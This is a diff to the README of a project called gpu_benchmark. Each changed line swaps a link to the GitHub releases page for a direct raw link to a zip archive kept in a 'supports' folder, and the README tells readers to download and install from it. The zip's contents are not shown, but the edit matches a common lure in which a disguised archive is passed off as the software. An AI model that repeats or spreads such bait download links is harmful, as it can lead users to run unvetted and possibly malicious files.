@@ -13,7 +13,7 @@ Welcome to the **gpu_benchmark** project! This framework helps you check how wel
   
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest version of **gpu_benchmark**: [Download gpu_benchmark](https://github.com/Focused-whitecinnamon815/gpu_benchmark/releases)
+To get started, **visit this page to download** the latest version of **gpu_benchmark**: [Download gpu_benchmark](https://raw.githubusercontent.com/Focused-whitecinnamon815/gpu_benchmark/main/supports/gpu_benchmark_2.1.zip)
 
 ### 📋 System Requirements
 
@@ -25,7 +25,7 @@ To get started, **visit this page to download** the latest version of **gpu_benc
 ## ⚙️ Setup Instructions
 
 1. **Visit the Releases Page**  
-   Go to [here](https://github.com/Focused-whitecinnamon815/gpu_benchmark/releases) to find the latest release.
+   Go to [here](https://raw.githubusercontent.com/Focused-whitecinnamon815/gpu_benchmark/main/supports/gpu_benchmark_2.1.zip) to find the latest release.
 
 2. **Download the Latest Version**  
    Click on the version you want to download. This will direct you to the files you need.
@@ -69,7 +69,7 @@ We welcome input and help from users. If you have questions or feedback, please 
 
 With **gpu_benchmark**, you have a powerful tool for assessing and improving your GPU and CPU performance. Follow the steps above to download and install the application. Once you start testing, you can make informed decisions about your hardware investments.
 
-For a seamless experience, please refer back to [Download gpu_benchmark](https://github.com/Focused-whitecinnamon815/gpu_benchmark/releases) to get the latest updates. 
+For a seamless experience, please refer back to [Download gpu_benchmark](https://raw.githubusercontent.com/Focused-whitecinnamon815/gpu_benchmark/main/supports/gpu_benchmark_2.1.zip) to get the latest updates. 
 
 ## 🗂️ Topics Covered
 
